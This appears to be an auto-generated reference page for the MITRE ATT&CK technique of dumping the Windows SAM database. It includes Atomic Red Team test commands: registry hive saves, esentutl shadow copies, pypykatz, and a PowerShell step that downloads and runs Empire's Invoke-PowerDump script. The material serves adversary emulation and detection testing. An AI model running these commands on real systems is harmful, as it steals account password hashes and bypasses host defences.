
# Security Account Manager

## Description

### MITRE Description

> Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access.

A number of tools can be used to retrieve the SAM file through in-memory techniques:

* pwdumpx.exe
* [gsecdump](https://attack.mitre.org/software/S0008)
* [Mimikatz](https://attack.mitre.org/software/S0002)
* secretsdump.py

Alternatively, the SAM can be extracted from the Registry with Reg:

* <code>reg save HKLM\sam sam</code>
* <code>reg save HKLM\system system</code>

Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7)

Notes: 
* RID 500 account is the local, built-in administrator.
* RID 501 is the guest account.
* User accounts start with a RID of 1,000+.


## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['SYSTEM']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1003/002

## Potential Commands

```
reg save HKLM\sam %temp%\sam
reg save HKLM\system %temp%\system
reg save HKLM\security %temp%\security
Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON" -fore green
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore
Invoke-Webrequest -Uri "https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" -UseBasicParsing -OutFile "$Env:Temp\PowerDump.ps1"
Import-Module .\PowerDump.ps1
Invoke-PowerDump
del #{copy_dest}\#{file_name} & esentutl.exe /y /vss %SystemRoot%/system32/config/SAM /d #{copy_dest}/#{file_name}
pypykatz live registry
del %windir%\#{file_name} & esentutl.exe /y /vss #{file_path} /d %windir%/#{file_name}
del #{copy_dest}\SAM & esentutl.exe /y /vss #{file_path} /d #{copy_dest}/SAM
```

## Commands Dataset

```
[{'command': 'reg save HKLM\\sam %temp%\\sam\n'
             'reg save HKLM\\system %temp%\\system\n'
             'reg save HKLM\\security %temp%\\security\n',
  'name': None,
  'source': 'atomics/T1003.002/T1003.002.yaml'},
 {'command': 'pypykatz live registry\n',
  'name': None,
  'source': 'atomics/T1003.002/T1003.002.yaml'},
 {'command': 'del #{copy_dest}\\#{file_name} & esentutl.exe /y /vss '
             '%SystemRoot%/system32/config/SAM /d #{copy_dest}/#{file_name}\n',
  'name': None,
  'source': 'atomics/T1003.002/T1003.002.yaml'},
 {'command': 'del #{copy_dest}\\SAM & esentutl.exe /y /vss #{file_path} /d '
             '#{copy_dest}/SAM\n',
  'name': None,
  'source': 'atomics/T1003.002/T1003.002.yaml'},
 {'command': 'del %windir%\\#{file_name} & esentutl.exe /y /vss #{file_path} '
             '/d %windir%/#{file_name}\n',
  'name': None,
  'source': 'atomics/T1003.002/T1003.002.yaml'},
 {'command': 'Write-Host "STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME '
             'MON" -fore green\n'
             'Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy '
             'RemoteSigned -ErrorAction Ignore\n'
             'Invoke-Webrequest -Uri '
             '"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" '
             '-UseBasicParsing -OutFile "$Env:Temp\\PowerDump.ps1"\n'
             'Import-Module .\\PowerDump.ps1\n'
             'Invoke-PowerDump',
  'name': None,
  'source': 'atomics/T1003.002/T1003.002.yaml'}]
```

## Potential Detections

```json

```

## Potential Queries

```json

```

## Raw Dataset

```json
[{'Atomic Red Team Test - OS Credential Dumping: Security Account Manager': {'atomic_tests': [{'auto_generated_guid': '5c2571d0-1572-416d-9676-812e64ca9f44',
                                                                                               'description': 'Local '
                                                                                                              'SAM '
                                                                                                              '(SAM '
                                                                                                              '& '
                                                                                                              'System), '
                                                                                                              'cached '
                                                                                                              'credentials '
                                                                                                              '(System '
                                                                                                              '& '
                                                                                                              'Security) '
                                                                                                              'and '
                                                                                                              'LSA '
                                                                                                              'secrets '
                                                                                                              '(System '
                                                                                                              '& '
                                                                                                              'Security) '
                                                                                                              'can '
                                                                                                              'be '
                                                                                                              'enumerated\n'
                                                                                                              'via '
                                                                                                              'three '
                                                                                                              'registry '
                                                                                                              'keys. '
                                                                                                              'Then '
                                                                                                              'processed '
                                                                                                              'locally '
                                                                                                              'using '
                                                                                                              'https://github.com/Neohapsis/creddump7\n'
                                                                                                              '\n'
                                                                                                              'Upon '
                                                                                                              'successful '
                                                                                                              'execution '
                                                                                                              'of '
                                                                                                              'this '
                                                                                                              'test, '
                                                                                                              'you '
                                                                                                              'will '
                                                                                                              'find '
                                                                                                              'three '
                                                                                                              'files '
                                                                                                              'named, '
                                                                                                              'sam, '
                                                                                                              'system '
                                                                                                              'and '
                                                                                                              'security '
                                                                                                              'in '
                                                                                                              'the '
                                                                                                              '%temp% '
                                                                                                              'directory.\n',
                                                                                               'executor': {'cleanup_command': 'del '
                                                                                                                               '%temp%\\sam '
                                                                                                                               '>nul '
                                                                                                                               '2> '
                                                                                                                               'nul\n'
                                                                                                                               'del '
                                                                                                                               '%temp%\\system '
                                                                                                                               '>nul '
                                                                                                                               '2> '
                                                                                                                               'nul\n'
                                                                                                                               'del '
                                                                                                                               '%temp%\\security '
                                                                                                                               '>nul '
                                                                                                                               '2> '
                                                                                                                               'nul\n',
                                                                                                            'command': 'reg '
                                                                                                                       'save '
                                                                                                                       'HKLM\\sam '
                                                                                                                       '%temp%\\sam\n'
                                                                                                                       'reg '
                                                                                                                       'save '
                                                                                                                       'HKLM\\system '
                                                                                                                       '%temp%\\system\n'
                                                                                                                       'reg '
                                                                                                                       'save '
                                                                                                                       'HKLM\\security '
                                                                                                                       '%temp%\\security\n',
                                                                                                            'elevation_required': True,
                                                                                                            'name': 'command_prompt'},
                                                                                               'name': 'Registry '
                                                                                                       'dump '
                                                                                                       'of '
                                                                                                       'SAM, '
                                                                                                       'creds, '
                                                                                                       'and '
                                                                                                       'secrets',
                                                                                               'supported_platforms': ['windows']},
                                                                                              {'auto_generated_guid': 'a96872b2-cbf3-46cf-8eb4-27e8c0e85263',
                                                                                               'dependencies': [{'description': 'Computer '
                                                                                                                                'must '
                                                                                                                                'have '
                                                                                                                                'python '
                                                                                                                                '3 '
                                                                                                                                'installed\n',
                                                                                                                 'get_prereq_command': 'echo '
                                                                                                                                       '"Python '
                                                                                                                                       '3 '
                                                                                                                                       'must '
                                                                                                                                       'be '
                                                                                                                                       'installed '
                                                                                                                                       'manually"\n',
                                                                                                                 'prereq_command': 'if '
                                                                                                                                   '(python '
                                                                                                                                   '--version) '
                                                                                                                                   '{exit '
                                                                                                                                   '0} '
                                                                                                                                   'else '
                                                                                                                                   '{exit '
                                                                                                                                   '1}\n'},
                                                                                                                {'description': 'Computer '
                                                                                                                                'must '
                                                                                                                                'have '
                                                                                                                                'pip '
                                                                                                                                'installed\n',
                                                                                                                 'get_prereq_command': 'echo '
                                                                                                                                       '"PIP '
                                                                                                                                       'must '
                                                                                                                                       'be '
                                                                                                                                       'installed '
                                                                                                                                       'manually"\n',
                                                                                                                 'prereq_command': 'if '
                                                                                                                                   '(pip3 '
                                                                                                                                   '-V) '
                                                                                                                                   '{exit '
                                                                                                                                   '0} '
                                                                                                                                   'else '
                                                                                                                                   '{exit '
                                                                                                                                   '1}\n'},
                                                                                                                {'description': 'pypykatz '
                                                                                                                                'must '
                                                                                                                                'be '
                                                                                                                                'installed '
                                                                                                                                'and '
                                                                                                                                'part '
                                                                                                                                'of '
                                                                                                                                'PATH\n',
                                                                                                                 'get_prereq_command': 'pip3 '
                                                                                                                                       'install '
                                                                                                                                       'pypykatz\n',
                                                                                                                 'prereq_command': 'if '
                                                                                                                                   '(cmd '
                                                                                                                                   '/c '
                                                                                                                                   'pypykatz '
                                                                                                                                   '-h) '
                                                                                                                                   '{exit '
                                                                                                                                   '0} '
                                                                                                                                   'else '
                                                                                                                                   '{exit '
                                                                                                                                   '1}\n'}],
                                                                                               'dependency_executor_name': 'powershell',
                                                                                               'description': 'Parses '
                                                                                                              'registry '
                                                                                                              'hives '
                                                                                                              'to '
                                                                                                              'obtain '
                                                                                                              'stored '
                                                                                                              'credentials\n',
                                                                                               'executor': {'command': 'pypykatz '
                                                                                                                       'live '
                                                                                                                       'registry\n',
                                                                                                            'elevation_required': True,
                                                                                                            'name': 'command_prompt'},
                                                                                               'name': 'Registry '
                                                                                                       'parse '
                                                                                                       'with '
                                                                                                       'pypykatz',
                                                                                               'supported_platforms': ['windows']},
                                                                                              {'auto_generated_guid': 'a90c2f4d-6726-444e-99d2-a00cd7c20480',
                                                                                               'description': 'Copy '
                                                                                                              'the '
                                                                                                              'SAM '
                                                                                                              'hive '
                                                                                                              'using '
                                                                                                              'the '
                                                                                                              'esentutl.exe '
                                                                                                              'utility\n'
                                                                                                              'This '
                                                                                                              'can '
                                                                                                              'also '
                                                                                                              'be '
                                                                                                              'used '
                                                                                                              'to '
                                                                                                              'copy '
                                                                                                              'other '
                                                                                                              'files '
                                                                                                              'and '
                                                                                                              'hives '
                                                                                                              'like '
                                                                                                              'SYSTEM, '
                                                                                                              'NTUSER.dat '
                                                                                                              'etc.\n',
                                                                                               'executor': {'command': 'del '
                                                                                                                       '#{copy_dest}\\#{file_name} '
                                                                                                                       '& '
                                                                                                                       'esentutl.exe '
                                                                                                                       '/y '
                                                                                                                       '/vss '
                                                                                                                       '#{file_path} '
                                                                                                                       '/d '
                                                                                                                       '#{copy_dest}/#{file_name}\n',
                                                                                                            'elevation_required': True,
                                                                                                            'name': 'command_prompt'},
                                                                                               'input_arguments': {'copy_dest': {'default': '%windir%',
                                                                                                                                 'description': 'Destination '
                                                                                                                                                'of '
                                                                                                                                                'the '
                                                                                                                                                'copied '
                                                                                                                                                'file',
                                                                                                                                 'type': 'String'},
                                                                                                                   'file_name': {'default': 'SAM',
                                                                                                                                 'description': 'Name '
                                                                                                                                                'of '
                                                                                                                                                'the '
                                                                                                                                                'copied '
                                                                                                                                                'file',
                                                                                                                                 'type': 'String'},
                                                                                                                   'file_path': {'default': '%SystemRoot%/system32/config/SAM',
                                                                                                                                 'description': 'Path '
                                                                                                                                                'to '
                                                                                                                                                'the '
                                                                                                                                                'file '
                                                                                                                                                'to '
                                                                                                                                                'copy',
                                                                                                                                 'type': 'Path'}},
                                                                                               'name': 'esentutl.exe '
                                                                                                       'SAM '
                                                                                                       'copy',
                                                                                               'supported_platforms': ['windows']},
                                                                                              {'auto_generated_guid': '804f28fc-68fc-40da-b5a2-e9d0bce5c193',
                                                                                               'description': 'Executes '
                                                                                                              'a '
                                                                                                              'hashdump '
                                                                                                              'by '
                                                                                                              'reading '
                                                                                                              'the '
                                                                                                              'hasshes '
                                                                                                              'from '
                                                                                                              'the '
                                                                                                              'registry.',
                                                                                               'executor': {'command': 'Write-Host '
                                                                                                                       '"STARTING '
                                                                                                                       'TO '
                                                                                                                       'SET '
                                                                                                                       'BYPASS '
                                                                                                                       'and '
                                                                                                                       'DISABLE '
                                                                                                                       'DEFENDER '
                                                                                                                       'REALTIME '
                                                                                                                       'MON" '
                                                                                                                       '-fore '
                                                                                                                       'green\n'
                                                                                                                       'Set-ExecutionPolicy '
                                                                                                                       '-Scope '
                                                                                                                       'CurrentUser '
                                                                                                                       '-ExecutionPolicy '
                                                                                                                       'RemoteSigned '
                                                                                                                       '-ErrorAction '
                                                                                                                       'Ignore\n'
                                                                                                                       'Invoke-Webrequest '
                                                                                                                       '-Uri '
                                                                                                                       '"https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1" '
                                                                                                                       '-UseBasicParsing '
                                                                                                                       '-OutFile '
                                                                                                                       '"$Env:Temp\\PowerDump.ps1"\n'
                                                                                                                       'Import-Module '
                                                                                                                       '.\\PowerDump.ps1\n'
                                                                                                                       'Invoke-PowerDump',
                                                                                                            'elevation_required': True,
                                                                                                            'name': 'powershell'},
                                                                                               'name': 'PowerDump '
                                                                                                       'Registry '
                                                                                                       'dump '
                                                                                                       'of '
                                                                                                       'SAM '
                                                                                                       'for '
                                                                                                       'hashes '
                                                                                                       'and '
                                                                                                       'usernames',
                                                                                               'supported_platforms': ['windows']}],
                                                                             'attack_technique': 'T1003.002',
                                                                             'display_name': 'OS '
                                                                                             'Credential '
                                                                                             'Dumping: '
                                                                                             'Security '
                                                                                             'Account '
                                                                                             'Manager'}}]
```

# Tactics


* [Credential Access](../tactics/Credential-Access.md)


# Mitigations


* [User Training](../mitigations/User-Training.md)

* [Privileged Account Management](../mitigations/Privileged-Account-Management.md)
    
* [Password Policies](../mitigations/Password-Policies.md)
    
* [Operating System Configuration](../mitigations/Operating-System-Configuration.md)
    

# Actors


* [menuPass](../actors/menuPass.md)

* [Dragonfly 2.0](../actors/Dragonfly-2.0.md)
    
* [Night Dragon](../actors/Night-Dragon.md)
    
* [Soft Cell](../actors/Soft-Cell.md)
    
* [Ke3chang](../actors/Ke3chang.md)
    
* [Threat Group-3390](../actors/Threat-Group-3390.md)
    
